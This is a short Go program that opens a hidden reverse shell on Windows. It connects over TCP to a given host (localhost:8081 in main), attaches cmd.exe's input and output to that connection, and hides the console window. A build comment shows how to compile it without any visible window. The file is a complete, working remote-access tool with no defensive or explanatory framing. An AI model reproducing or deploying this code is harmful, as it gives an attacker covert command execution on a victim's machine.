package main

// go build -ldflags -H=windowsgui socket.go
import (
	"fmt"
	"net"
	"os/exec"
	"syscall"
)

func ReverseShell(host string) {
	con, err := net.Dial("tcp", host)

	if err != nil {
		fmt.Println(err)
	}

	cmd := exec.Command("cmd.exe")
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // for hide Windows
	cmd.Run()
}

func main() {
	ReverseShell("127.0.0.1:8081")
}
